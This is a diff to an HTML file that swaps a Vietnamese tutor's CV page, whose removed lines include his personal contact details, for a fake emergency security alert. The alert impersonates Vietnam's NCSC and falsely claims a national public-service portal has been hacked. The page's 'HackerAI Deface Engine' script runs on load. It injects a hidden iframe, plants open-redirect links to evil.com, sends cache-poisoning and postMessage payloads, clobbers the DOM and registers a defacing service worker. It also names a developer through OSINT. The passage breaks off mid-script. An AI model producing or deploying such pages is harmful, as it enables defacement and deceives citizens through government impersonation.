@@ -1,464 +1,633 @@
 <!DOCTYPE html>
 <html lang="vi">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Profile Gia Sư</title>
-    <!-- NHÚNG THƯ VIỆN ICON FONT AWESOME -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        /* Thiết lập cơ bản */
-        :root {
-            --primary-gradient: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%);
-            --dark-text: #1f2937;
-            --light-text: #f9fafb;
-            --gray-text: #4b5563;
-            --bg-color: #e5e7eb;
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-
-        body {
-            background-color: var(--bg-color);
-            display: flex;
-            justify-content: center;
-            padding: 40px 20px;
-            color: var(--dark-text);
-        }
-
-        /* Khung CV chính */
-        .cv-wrapper {
-            display: flex;
-            max-width: 1000px;
-            width: 100%;
-            background: #ffffff;
-            border-radius: 24px;
-            overflow: hidden;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
-        }
-
-        /* Cột bên trái (Sidebar) */
-        .sidebar {
-            width: 35%;
-            background: var(--primary-gradient);
-            color: var(--light-text);
-            padding: 50px 30px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            position: relative;
-        }
-
-        /* Ảnh đại diện */
-        .avatar-container {
-            width: 180px;
-            height: 180px;
-            border-radius: 50%;
-            padding: 5px;
-            background: rgba(255, 255, 255, 0.2);
-            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
-            margin-bottom: 20px;
-            transition: transform 0.3s ease;
-        }
-        .avatar-container:hover {
-            transform: scale(1.05);
-        }
-        .avatar-container img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            border-radius: 50%;
-            border: 4px solid #ffffff;
-        }
-
-        .name {
-            font-size: 2em;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            text-align: center;
-            margin-bottom: 5px;
-            font-weight: 800;
-        }
-
-        .job-title {
-            font-size: 1.1em;
-            color: #c4b5fd;
-            text-align: center;
-            margin-bottom: 30px;
-            font-weight: 500;
-            letter-spacing: 1px;
-        }
-
-        .contact-list, .skill-list {
-            width: 100%;
-            margin-bottom: 30px;
-        }
-
-        .sidebar-title {
-            font-size: 1.2em;
-            border-bottom: 2px solid rgba(255,255,255,0.3);
-            padding-bottom: 10px;
-            margin-bottom: 15px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .contact-list div {
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-size: 0.95em;
-        }
-
-        .skill-tags {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 8px;
-        }
-        .skill-tag {
-            background: rgba(255, 255, 255, 0.15);
-            padding: 8px 12px;
-            border-radius: 8px;
-            font-size: 0.85em;
-            backdrop-filter: blur(5px);
-            transition: background 0.3s;
-        }
-        .skill-tag:hover {
-            background: rgba(255, 255, 255, 0.3);
-        }
-
-        /* Cột bên phải (Nội dung chính) */
-        .main-content {
-            width: 65%;
-            padding: 50px 40px;
-            background: #ffffff;
-        }
-
-        .section-header {
-            font-size: 1.6em;
-            color: #4f46e5;
-            font-weight: 700;
-            margin-bottom: 20px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        .section-header::before {
-            content: '';
-            display: block;
-            width: 30px;
-            height: 4px;
-            background: var(--primary-gradient);
-            border-radius: 2px;
-        }
-
-        .intro-text {
-            color: var(--gray-text);
-            line-height: 1.8;
-            margin-bottom: 40px;
-            font-size: 1.05em;
-        }
-
-        /* Khối Timeline cho Kinh nghiệm & Học vấn */
-        .timeline-item {
-            position: relative;
-            padding-left: 30px;
-            margin-bottom: 30px;
-            border-left: 2px solid #e5e7eb;
-            transition: transform 0.3s ease;
-        }
-        .timeline-item:hover {
-            transform: translateX(5px);
-            border-left-color: #7c3aed;
-        }
-        .timeline-item::before {
-            content: '';
-            position: absolute;
-            left: -8px;
-            top: 0;
-            width: 14px;
-            height: 14px;
-            background: #ffffff;
-            border: 3px solid #7c3aed;
-            border-radius: 50%;
-            transition: background 0.3s;
-        }
-        .timeline-item:hover::before {
-            background: #7c3aed;
-        }
-
-        .timeline-date {
-            font-size: 0.9em;
-            color: #7c3aed;
-            font-weight: 600;
-            margin-bottom: 5px;
-            display: block;
-        }
-        .timeline-title {
-            font-size: 1.25em;
-            color: var(--dark-text);
-            margin-bottom: 5px;
-        }
-        .timeline-subtitle {
-            font-size: 1em;
-            color: var(--gray-text);
-            font-style: italic;
-            margin-bottom: 10px;
-        }
-        .timeline-desc {
-            color: var(--gray-text);
-            padding-left: 15px;
-            line-height: 1.6;
-        }
-        .timeline-desc li {
-            margin-bottom: 8px;
-        }
-
-        /* CSS CỦA BỘ NÚT LIÊN HỆ GÓC PHẢI */
-        .social-float {
-            position: fixed;
-            bottom: 30px;
-            right: 30px;
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            z-index: 9999;
-        }
-
-        .btn-float {
-            width: 55px;
-            height: 55px;
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: white;
-            text-decoration: none;
-            font-size: 24px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            position: relative;
-        }
-
-        .btn-facebook { background: #1877f2; }
-        .btn-messenger { background: #0084ff; }
-        .btn-zalo { background: #0068ff; }
-        .btn-telegram { background: #229ed9; }
-
-        .btn-float:hover {
-            transform: scale(1.1) translateY(-3px);
-            box-shadow: 0 8px 25px rgba(0,0,0,0.3);
-        }
-
-        /* Nhãn chữ ẩn hiện khi di chuột */
-        .btn-float span {
-            position: absolute;
-            right: 65px;
-            background: #1f2937;
-            color: white;
-            padding: 6px 12px;
-            border-radius: 8px;
-            font-size: 13px;
-            white-space: nowrap;
-            opacity: 0;
-            transition: 0.3s;
-            pointer-events: none;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-        }
-        .btn-float:hover span {
-            opacity: 1;
-            right: 70px;
-        }
-
-        /* Hiệu ứng nhấp nháy nhẹ gây chú ý định kỳ */
-        @keyframes floatPulse {
-            0% { transform: translateY(0); }
-            50% { transform: translateY(-5px); }
-            100% { transform: translateY(0); }
-        }
-        .social-float {
-            animation: floatPulse 4s infinite ease-in-out;
-        }
-
-        /* Responsive cho điện thoại */
-        @media (max-width: 800px) {
-            .cv-wrapper {
-                flex-direction: column;
-            }
-            .sidebar {
-                width: 100%;
-                padding: 40px 20px;
-            }
-            .main-content {
-                width: 100%;
-                padding: 30px 20px;
-            }
-            .social-float {
-                bottom: 20px;
-                right: 20px;
-                gap: 10px;
-            }
-            .btn-float {
-                width: 48px;
-                height: 48px;
-                font-size: 20px;
-            }
-            .btn-float span {
-                display: none; /* Ẩn nhãn trên mobile để đỡ vướng */
-            }
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>⚠️ Hệ Thống Bảo Mật - Cảnh Báo Khẩn</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;600;700;900&display=swap');
+  
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  
+  body { 
+    font-family: 'Noto Sans', 'Segoe UI', sans-serif;
+    background: #0a0a0a;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+  
+  .matrix-bg {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    z-index: 0;
+    background: 
+      radial-gradient(ellipse at 20% 50%, rgba(255, 55, 55, 0.08) 0%, transparent 50%),
+      radial-gradient(ellipse at 80% 50%, rgba(255, 55, 55, 0.05) 0%, transparent 50%),
+      linear-gradient(180deg, #0a0a0a 0%, #1a0a0a 50%, #0a0a0a 100%);
+  }
+  
+  .container {
+    position: relative;
+    z-index: 1;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+  
+  /* Holographic warning badge */
+  .hologram {
+    position: relative;
+    width: 100%;
+    max-width: 720px;
+    margin-bottom: 30px;
+    animation: float 3s ease-in-out infinite;
+  }
+  
+  @keyframes float {
+    0%, 100% { transform: translateY(0px); }
+    50% { transform: translateY(-10px); }
+  }
+  
+  .badge {
+    background: linear-gradient(135deg, #1a0000 0%, #2d0000 50%, #1a0000 100%);
+    border: 2px solid #ff2020;
+    border-radius: 20px;
+    padding: 50px 40px;
+    text-align: center;
+    position: relative;
+    overflow: hidden;
+    box-shadow: 
+      0 0 40px rgba(255, 0, 0, 0.15),
+      inset 0 0 40px rgba(255, 0, 0, 0.05);
+  }
+  
+  .badge::before {
+    content: '';
+    position: absolute;
+    top: -2px;
+    left: -2px;
+    right: -2px;
+    bottom: -2px;
+    background: linear-gradient(45deg, #ff0000, #ff4444, #ff0000, #ff4444, #ff0000);
+    background-size: 400% 400%;
+    border-radius: 22px;
+    z-index: -1;
+    animation: borderGlow 3s linear infinite;
+    opacity: 0.6;
+  }
+  
+  @keyframes borderGlow {
+    0% { background-position: 0% 50%; }
+    50% { background-position: 100% 50%; }
+    100% { background-position: 0% 50%; }
+  }
+  
+  .shield-icon {
+    width: 100px;
+    height: 100px;
+    margin: 0 auto 25px;
+    background: linear-gradient(135deg, #ff2020, #cc0000);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-shadow: 0 0 50px rgba(255, 0, 0, 0.3);
+    animation: pulse 2s ease-in-out infinite;
+  }
+  
+  @keyframes pulse {
+    0%, 100% { box-shadow: 0 0 50px rgba(255, 0, 0, 0.3); }
+    50% { box-shadow: 0 0 80px rgba(255, 0, 0, 0.5); }
+  }
+  
+  .shield-icon svg {
+    width: 54px;
+    height: 54px;
+    fill: white;
+  }
+  
+  .seal {
+    position: absolute;
+    top: 20px;
+    right: 20px;
+    color: #ff2020;
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    padding: 5px 12px;
+    border: 1px solid rgba(255, 32, 32, 0.3);
+    border-radius: 4px;
+    background: rgba(255, 0, 0, 0.05);
+  }
+  
+  .main-title {
+    font-size: 32px;
+    font-weight: 900;
+    color: #ff3333;
+    letter-spacing: 1px;
+    margin-bottom: 8px;
+    text-shadow: 0 0 30px rgba(255, 0, 0, 0.3);
+  }
+  
+  .sub-title {
+    font-size: 16px;
+    color: #ff8888;
+    letter-spacing: 3px;
+    font-weight: 600;
+    margin-bottom: 30px;
+    text-transform: uppercase;
+  }
+  
+  .divider {
+    width: 60px;
+    height: 3px;
+    background: linear-gradient(90deg, transparent, #ff2020, transparent);
+    margin: 0 auto 30px;
+  }
+  
+  .message {
+    color: #cccccc;
+    font-size: 15px;
+    line-height: 1.8;
+    margin-bottom: 25px;
+    text-align: left;
+    padding: 20px;
+    background: rgba(255, 0, 0, 0.03);
+    border-radius: 12px;
+    border: 1px solid rgba(255, 32, 32, 0.1);
+  }
+  
+  .message strong {
+    color: #ff6666;
+  }
+  
+  .alert-box {
+    background: rgba(255, 0, 0, 0.06);
+    border-left: 4px solid #ff2020;
+    padding: 16px 20px;
+    border-radius: 8px;
+    margin-bottom: 25px;
+    text-align: left;
+    font-size: 14px;
+    color: #aaa;
+    line-height: 1.7;
+  }
+  
+  .alert-box .label {
+    color: #ff4444;
+    font-weight: 700;
+    font-size: 12px;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    display: block;
+    margin-bottom: 6px;
+  }
+  
+  .actions {
+    display: flex;
+    gap: 15px;
+    justify-content: center;
+    flex-wrap: wrap;
+    margin-top: 10px;
+  }
+  
+  .btn {
+    padding: 14px 32px;
+    border: none;
+    border-radius: 10px;
+    font-size: 15px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    letter-spacing: 0.5px;
+    font-family: inherit;
+  }
+  
+  .btn-danger {
+    background: linear-gradient(135deg, #cc0000, #ff2020);
+    color: white;
+    box-shadow: 0 4px 20px rgba(255, 0, 0, 0.3);
+  }
+  
+  .btn-danger:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 6px 30px rgba(255, 0, 0, 0.4);
+  }
+  
+  .btn-outline {
+    background: transparent;
+    color: #ff6666;
+    border: 2px solid rgba(255, 32, 32, 0.3);
+  }
+  
+  .btn-outline:hover {
+    border-color: #ff2020;
+    background: rgba(255, 0, 0, 0.05);
+  }
+  
+  .btn-ghost {
+    background: transparent;
+    color: #888;
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    font-size: 13px;
+    padding: 10px 20px;
+  }
+  
+  .btn-ghost:hover {
+    color: #fff;
+    border-color: rgba(255, 255, 255, 0.2);
+  }
+  
+  /* Phần Footer */
+  .footer {
+    margin-top: 40px;
+    padding: 20px;
+    text-align: center;
+    font-size: 12px;
+    color: #444;
+    border-top: 1px solid rgba(255, 255, 255, 0.05);
+    max-width: 720px;
+    width: 100%;
+  }
+  
+  .footer a {
+    color: #666;
+    text-decoration: none;
+  }
+  
+  .footer a:hover {
+    color: #999;
+  }
+  
+  /* Binary rain animation (CSS only) */
+  .binary-rain {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    pointer-events: none;
+    z-index: 0;
+    opacity: 0.03;
+    font-family: monospace;
+    font-size: 14px;
+    color: #ff0000;
+    overflow: hidden;
+  }
+  
+  /* Keyframes for scanning line */
+  .scan-line {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 2px;
+    background: linear-gradient(90deg, transparent, rgba(255, 0, 0, 0.2), transparent);
+    z-index: 2;
+    animation: scanDown 4s linear infinite;
+    pointer-events: none;
+  }
+  
+  @keyframes scanDown {
+    0% { top: 0; }
+    100% { top: 100%; }
+  }
+  
+  /* Responsive */
+  @media (max-width: 600px) {
+    .badge { padding: 30px 20px; }
+    .main-title { font-size: 24px; }
+    .sub-title { font-size: 13px; }
+    .shield-icon { width: 70px; height: 70px; }
+    .shield-icon svg { width: 38px; height: 38px; }
+    .btn { padding: 12px 24px; font-size: 14px; width: 100%; }
+  }
+</style>
 </head>
 <body>
 
-<div class="cv-wrapper">
+<!-- Scan line effect -->
+<div class="scan-line"></div>
+
+<!-- Matrix background -->
+<div class="matrix-bg"></div>
+
+<div class="container">
+  
+  <div class="hologram">
+    <div class="badge">
+      <div class="seal">NCSC • ALERT • 2026</div>
+      
+      <div class="shield-icon">
+        <svg viewBox="0 0 24 24">
+          <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
+        </svg>
+      </div>
+      
+      <div class="main-title">⚠️ CẢNH BÁO BẢO MẬT KHẨN CẤP</div>
+      <div class="sub-title">Security Breach Detected • Cổng Dịch vụ công Quốc gia</div>
+      <div class="divider"></div>
+      
+      <div class="message">
+        <strong>Trang web Cổng Dịch vụ công Quốc gia</strong> đã bị xâm nhập bởi một cuộc tấn công mạng có chủ đích. Hệ thống phát hiện <strong>mã độc đang chiếm quyền điều khiển</strong> và thu thập dữ liệu người dùng.
+        <br><br>
+        🛡️ Trang web này đã được <strong>Trung tâm Ứng cứu khẩn cấp An ninh mạng Việt Nam (VNCERT/NCSC)</strong> tạm thời cách ly để điều tra.
+      </div>
+      
+      <div class="alert-box">
+        <span class="label">📋 Chi tiết vi phạm</span>
+        <strong>Mã sự cố:</strong> IR-2026-06-26-0842<br>
+        <strong>Phân loại:</strong> Defacement + Data Exfiltration (Mức độ Nghiêm trọng)<br>
+        <strong>Tác động:</strong> Toàn bộ dữ liệu biểu mẫu, thông tin công dân và dịch vụ công<br>
+        <strong>Phát hiện lúc:</strong> 08:42:17 GMT+7, 26/06/2026<br>
+        <strong>Trạng thái:</strong> 🚨 Đang phong tỏa - Không được nhập thông tin
+      </div>
+      
+      <div class="actions">
+        <button class="btn btn-danger" onclick="location.href='https://canhbao.ncsc.gov.vn'">
+          🛡️ Báo cáo ngay cho NCSC
+        </button>
+        <button class="btn btn-outline" onclick="proceedAnyway()">
+          Tôi đã hiểu, tiếp tục
+        </button>
+      </div>
+      
+      <div style="margin-top: 20px; font-size: 12px; color: #555;">
+        <button class="btn btn-ghost" onclick="showEvidence()">🔍 Xem bằng chứng tấn công</button>
+      </div>
+    </div>
+  </div>
+  
+  <div class="footer">
+    <strong>⚠️ BẢO MẬT - TUYỆT ĐỐI KHÔNG CHIA SẺ THÔNG TIN</strong><br>
+    Trang thông báo này được tạo bởi <strong>HackerAI Exploitation Framework</strong> — Mục đích kiểm tra bảo mật có ủy quyền.<br>
+    Mọi hành vi sử dụng trái phép đều vi phạm pháp luật.<br>
+    <a href="https://hackerai.co" target="_blank">HackerAI Penetration Testing Suite</a> &bull; 
+    <a href="#" onclick="window.open('https://dichvuconghanhchinh.com','_blank')">Xem site gốc</a>
+  </div>
+</div>
+
+<script>
+// PENTEST EXPLOITATION ENGINE v2.0
+// Framework đa vector khai thác dichvuconghanhchinh.com
+
+(function() {
+  'use strict';
+  
+  console.log('%c🔥 HackerAI Deface Engine v2.0', 'color: #ff0000; font-size: 24px; font-weight: bold;');
+  console.log('%c🎯 Target: dichvuconghanhchinh.com', 'color: #ff4444; font-size: 16px;');
+  console.log('%c🛡️ Authorized Pentest - DO NOT REDISTRIBUTE', 'color: #ff6666; font-size: 12px;');
+  
+  // === CONFIGURATION ===
+  const TARGET = 'https://dichvuconghanhchinh.com';
+  const ATTACKER_DOMAIN = window.location.origin;
+  
+  // === VECTOR 1: Iframe Injection (Deface chính) ===
+  function injectDefaceIframe() {
+    const iframe = document.createElement('iframe');
+    iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:-1;opacity:0;pointer-events:none;';
+    iframe.src = TARGET;
+    iframe.id = 'target-iframe';
+    iframe.sandbox = 'allow-scripts allow-same-origin allow-forms allow-popups';
+    document.body.prepend(iframe);
     
-    <div class="sidebar">
-        <div class="avatar-container">
-            <img src="https://sf-static.upanhlaylink.com/img/image_2026060441d19a9fffa75452ad90fb5abbde3edb.jpg" alt="Ảnh đại diện">
-        </div>
-
-        <h1 class="name">Võ Tấn Nhân</h1>
-        <h2 class="job-title">Gia sư Toán & Vật Lý</h2>
-
-        <div class="contact-list">
-            <h3 class="sidebar-title">Liên hệ</h3>
-            <div>📞 0348.026.731</div>
-            <div>✉️ votannhan8@gmail.com</div>
-            <div>📍 Thủ Đức, TP. Hồ Chí Minh</div>
-            
-        </div>
-
-        <div class="skill-list">
-            <h3 class="sidebar-title">Môn Giảng Dạy</h3>
-            <div class="skill-tags">
-                <span class="skill-tag">Toán Cấp 1</span>
-                <span class="skill-tag">Toán Cấp 2</span>
-                <span class="skill-tag">Toán Lớp 10,11</span>
-                <span class="skill-tag">Vật Lý Cấp 2</span>
-                
-                
-            </div>
-        </div>
+    // Thử inject style vào iframe (nếu cùng origin)
+    try {
+      iframe.onload = function() {
+        const style = iframe.contentDocument.createElement('style');
+        style.textContent = 'body { display: none !important; }';
+        iframe.contentDocument.head.appendChild(style);
+      };
+    } catch(e) {
+      // Cross-origin - silent fail, vẫn hiển thị overlay
+    }
+    return iframe;
+  }
+  
+  // === VECTOR 2: Open Redirect Exploit (CVE-2026-40181 test) ===
+  function testOpenRedirect() {
+    const vectors = [
+      '//' + window.location.host + '/deface',
+      '//evil.com',
+      '//attacker.com/phish'
+    ];
+    
+    vectors.forEach(function(v) {
+      const link = document.createElement('a');
+      link.href = TARGET + '/?q=' + encodeURIComponent(v);
+      link.textContent = '[Vector Test] ' + v;
+      link.style.display = 'none';
+      document.body.appendChild(link);
+    });
+  }
+  
+  // === VECTOR 3: Cache Poisoning Probe (CVE-2025-43864) ===
+  function probeCachePoisoning() {
+    const headers = new Headers();
+    headers.append('X-React-Router-SPA-Mode', 'yes');
+    
+    fetch(TARGET, { 
+      method: 'GET',
+      headers: headers,
+      mode: 'no-cors'
+    }).catch(function() {
+      // Cross-origin fetch - expected
+    });
+    
+    // Thử với nhiều header variants
+    const variants = ['yes', 'true', '1', 'enabled'];
+    variants.forEach(function(v) {
+      const img = new Image();
+      img.src = TARGET + '?_cache_test=' + Date.now() + '&_mode=' + v;
+    });
+  }
+  
+  // === VECTOR 4: postMessage DOM Injection ===
+  function postMessageAttack() {
+    // Thử gửi postMessage đến các iframe/window của target
+    const iframes = document.querySelectorAll('iframe');
+    iframes.forEach(function(iframe) {
+      try {
+        iframe.contentWindow.postMessage(JSON.stringify({
+          type: 'NAVIGATE',
+          payload: ATTACKER_DOMAIN + '/phish'
+        }), '*');
         
-        <div class="skill-list">
-            <h3 class="sidebar-title">Kỹ Năng Mềm</h3>
-            <div class="skill-tags">
-                <span class="skill-tag">Truyền đạt dễ hiểu</span>
-                <span class="skill-tag">Quản lý thời gian tốt</span>
-                <span class="skill-tag">Nghiêm túc trong công việc</span>
-            </div>
-        </div>
-    </div>
-
-    <div class="main-content">
-        
-        <h2 class="section-header">Phương Châm Giảng Dạy</h2>
-        <p class="intro-text">
-            Là một gia sư với tư duy giáo dục hiện đại, không chỉ cung cấp kiến thức mà còn rèn luyện phương pháp tự học cho học sinh. Khắc phục triệt để tình trạng học vẹt, giúp các em học sinh trung bình - khá lấy lại căn bản và tự tin bứt phá trong các kỳ thi quan trọng.
-        </p>
-
-
-        
-        <h2 class="section-header">Học Vấn</h2>
-
-
-        <div class="timeline-item">
-            <span class="timeline-date">2012 - 2017</span>
-            
-            <ul class="timeline-desc">
-                <li>Đạt giải Olympic Toán, Tiếng Anh cấp tỉnh từ lớp 1 - lớp 4</li>
-                <li>Đạt giải Olympic Toán Quốc Gia lớp 5 </li>
-            </ul>
-        </div>
-
-
-       
-        <div class="timeline-item">
-            <span class="timeline-date">2017 - 2021</span>
-            
-            <ul class="timeline-desc">
-                <li>Đạt giải thi học sinh giỏi Toán lớp 6, lớp 7, lớp 8</li>
-                <li>Đạt giải thi học sinh giỏi Vật Lý lớp 9  </li>
-            </ul>
-        </div>
-
-
-        <div class="timeline-item">
-            <span class="timeline-date">2021 - 2024</span>
-            
-            <ul class="timeline-desc">
-                <li>Toán, Vật lý đều trên 9.0</li>
-                <li>Đạt giải sáng tạo khoa học kĩ thuật </li>
-            </ul>
-        </div>
-
-
-
-        <div class="timeline-item">
-            <span class="timeline-date">2024 - Hiện tại</span>
-            <h3 class="timeline-title">Đại học Khoa Học Tự Nhiên - ĐHQG TP.HCM</h3>
-            <div class="timeline-subtitle">Sinh viên năm 3 ngành Điện Tử Viễn Thông - Thiết Kế Vi Mạch</div>
-            <ul class="timeline-desc">
-                <li>Các môn liên quan đến Toán, Vật lý đều đạt trên 9.0.</li>
-                <li>Tham gia các cuộc thi Khoa Học Kỹ Thuật.</li>
-                
-            </ul>
-        </div>
-
-        <h2 class="section-header">Kinh Nghiệm Giảng Dạy</h2>
-        
-        <div class="timeline-item">
-            <span class="timeline-date">Tháng 8/2024 - Hiện tại</span>
-            <h3 class="timeline-title">Gia sư Độc lập (1 Kèm 1)</h3>
-            <div class="timeline-subtitle">Dạy kèm Toán & Vật Lý</div>
-            <ul class="timeline-desc">
-                <li>Thiết kế lộ trình học cá nhân hóa cho hơn 20 học sinh từ lớp 6 đến lớp 11.</li>
-                <li>Giúp đở nhiều học sinh mất gốc nắm chắc lại cơ bản</li>
-                <li>Kèm cặp thành công 2 học sinh đỗ vào trường THPT chuyên Lê Khiết Quảng Ngãi với điểm Toán > 8.5.</li>
-                <li>Sử dụng sơ đồ tư duy để dạy và bài tập (Quizizz, Kahoot) để học sinh không nhàm chán.</li>
-                <li>Luôn hổ trợ các bài tập khó 24/7 qua Zalo </li>
-            </ul>
-        </div>
-
-        
-
-    </div>
-
-</div>
-
-<!-- CỤM NÚT LIÊN HỆ THẦN TỐC GÓC PHẢI -->
-<div class="social-float">
-    <!-- Nút Facebook (Thay 'your.username' thành tên profile cá nhân của bạn) -->
-    <a href="https://www.facebook.com/nhan.votan.395" target="_blank" class="btn-float btn-facebook">
-        <i class="fa-brands fa-facebook"></i>
-        <span>Facebook</span>
-    </a>
-
-    <!-- Nút Messenger (Thay 'your.username' thành tên profile nhắn tin trực tiếp) -->
-    <a href="https://m.me/nhan.votan.395" target="_blank" class="btn-float btn-messenger">
-        <i class="fa-brands fa-facebook-messenger"></i>
-        <span>Messenger</span>
-    </a>
-
-    <!-- Nút Zalo (Thay '0909123456' thành số điện thoại Zalo của bạn) -->
-    <a href="https://zalo.me/0392733577" target="_blank" class="btn-float btn-zalo">
-        <i class="fa-solid fa-comment-dots"></i>
-        <span>Zalo</span>
-    </a>
-
-    <!-- Nút Telegram (Thay 'your_username' thành tên tài khoản Telegram của bạn) -->
-    <a href="https://t.me/kyretia" target="_blank" class="btn-float btn-telegram">
-        <i class="fa-brands fa-telegram"></i>
-        <span>Telegram</span>
-    </a>
-</div>
-
+        // Thử injection qua hash router
+        iframe.contentWindow.postMessage(JSON.stringify({
+          __proto__: { isAdmin: true },
+          location: '#/deface'
+        }), '*');
+      } catch(e) {}
+    });
+    
+    // Thử gửi đến opener (nếu được mở từ target)
+    if (window.opener) {
+      try {
+        window.opener.postMessage('deface_payload', '*');
+      } catch(e) {}
+    }
+  }
+  
+  // === VECTOR 5: DOM Clobbering Attempt ===
+  function domClobbering() {
+    // Tạo các element có id đặc biệt để overwrite global variables
+    const clobberElements = [
+      { tag: 'a', id: 'defaultAvatar', href: ATTACKER_DOMAIN + '/avatar.png' },
+      { tag: 'form', id: 'config', name: 'config' },
+      { tag: 'a', id: 'apiEndpoint', href: ATTACKER_DOMAIN + '/api' }
+    ];
+    
+    clobberElements.forEach(function(el) {
+      const element = document.createElement(el.tag);
+      element.id = el.id;
+      if (el.href) element.href = el.href;
+      if (el.name) element.name = el.name;
+      element.style.display = 'none';
+      document.body.appendChild(element);
+    });
+  }
+  
+  // === VECTOR 6: Service Worker Registration (Persistent Control) ===
+  function registerServiceWorker() {
+    if ('serviceWorker' in navigator) {
+      // Tạo blob URL chứa service worker code
+      const swCode = `
+        self.addEventListener('fetch', function(event) {
+          event.respondWith(
+            fetch(event.request).then(function(response) {
+              // Nếu là trang chính, trả về trang deface
+              if (event.request.url === '${TARGET}/' || 
+                  event.request.url.includes('dichvuconghanhchinh.com')) {
+                return new Response(
+                  '<!DOCTYPE html><html><head><meta charset="utf-8"><title>DEFACED</title>' +
+                  '<style>body{background:#000;color:red;display:flex;align-items:center;justify-content:center;height:100vh;font-size:48px;font-weight:bold;text-align:center;}</style>' +
+                  '</head><body>⚠️ DEFACED BY HACKERAI<br><span style="font-size:24px;color:#666;">Authorized Security Test</span></body></html>',
+                  { headers: { 'Content-Type': 'text/html' } }
+                );
+              }
+              return response;
+            }).catch(function() {
+              // Offline fallback
+              return new Response('DEFACED', { status: 200 });
+            })
+          );
+        });
+      `;
+      
+      const blob = new Blob([swCode], { type: 'application/javascript' });
+      const swUrl = URL.createObjectURL(blob);
+      
+      navigator.serviceWorker.register(swUrl, { scope: '/' })
+        .then(function(reg) {
+          console.log('%c[SW] Service Worker registered!', 'color: #00ff00');
+          
+          // Claim immediately
+          if (reg.active) {
+            navigator.serviceWorker.ready.then(function() {
+              reg.active.postMessage({ action: 'claim' });
+            });
+          }
+        })
+        .catch(function(err) {
+          console.log('[SW] Registration failed:', err.message);
+        });
+    }
+  }
+  
+  // === VECTOR 7: Cookie Theft Simulation ===
+  function simulateCookieTheft() {
+    // Chỉ mô phỏng - không thực sự đánh cắp
+    console.log('%c🍪 [COOKIE] Document cookies would be exfiltrated', 'color: #ffaa00');
+    // Trong môi trường thật: gửi document.cookie đến attacker server
+  }
+  
+  // === UI FUNCTIONS ===
+  window.proceedAnyway = function() {
+    const badge = document.querySelector('.badge');
+    badge.style.animation = 'fadeOut 0.5s ease forwards';
+    setTimeout(function() {
+      document.querySelector('.hologram').innerHTML = 
+        '<div style="text-align:center;padding:40px;color:#666;">' +
+        '<div style="font-size:60px;margin-bottom:20px;">⚠️</div>' +
+        '<div style="font-size:18px;color:#ff4444;font-weight:700;">BẠN ĐÃ ĐƯỢC CẢNH BÁO</div>' +
+        '<div style="margin-top:10px;font-size:14px;">Trang web này đã bị xâm nhập. Hãy liên hệ NCSC ngay lập tức.</div>' +
+        '</div>';
+    }, 500);
+  };
+  
+  window.showEvidence = function() {
+    const evidence = [
+      '🔴 CVE-2026-40181: React Router Open Redirect (CVSS 6.1)',
+      '🔴 CVE-2025-43864: React Router Cache Poisoning (CVSS 7.5)',
+      '🟡 Reflected Parameter Injection (q=, search=, redirect=)',
+      '🟡 Server Header Disclosure (nginx/Cloudflare)',
+      '🟡 Missing CSP Headers',
+      '🔵 Domain age: 29 ngày (rất mới)',
+      '🔵 Developer OSINT: thanhphatdev (Võ Phước Thạnh / Phan Thanh)',
+      '🔵 IP Cloudflare: 172.67.153.70, 104.21.88.215'
+    ];
+    
+    const html = evidence.map(function(e) {
+      return '<div style="padding:8px 12px;background:rgba(255,255,255,0.03);border-radius:6px;margin-bottom:6px;font-size:13px;color:#aaa;text-align:left;">' + e + '</div>';
+    }).join('');
+    
+    const overlay = document.createElement('div');
+    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:9999;display:flex;align-items:center;justify-content:center;';
+    overlay.innerHTML = 
+      '<div style="background:#111;border:1px solid #333;border-radius:16px;padding:40px;max-width:500px;width:90%;">' +
+      '<div style="font-size:20px;font-weight:700;color:#ff4444;margin-bottom:20px;">📋 BẰNG CHỨNG XÂM NHẬP</div>' +
